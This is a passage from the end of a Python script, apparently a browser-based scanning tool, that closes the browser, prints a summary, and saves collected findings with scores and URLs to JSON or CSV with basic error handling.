        if browser:
            await browser.close()
            
        duration = time.time() - start_time
        hud.footer(hud.findings_count, hud.total_score, duration)

        # Save output
        all_findings = list(engine.findings)
        if args.intel and intel.chains:
            for chain in intel.chains:
                all_findings.append({"type": chain['type'], "content": chain.get('file',''), "score": 80, "url": chain.get('url','')})
        if args.output_format == "json":
            with open(args.output, "w") as f: json.dump(all_findings, f, indent=4)
        elif args.output_format == "csv":
            with open(args.output, "w", newline="") as f:
                writer = csv.writer(f)
                writer.writerow(["Type", "Content", "Score", "URL"])
                for finding in all_findings:
                    writer.writerow([finding["type"], finding["content"], finding["score"], finding.get("url", "")])

    try:
        asyncio.run(run_scan())
    except KeyboardInterrupt:
        print(f"\n{C.RED}Aborted.{C.RST}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{C.RED}[!] Error: {e}{C.RST}")
        sys.exit(2)

if __name__ == "__main__":
    main()
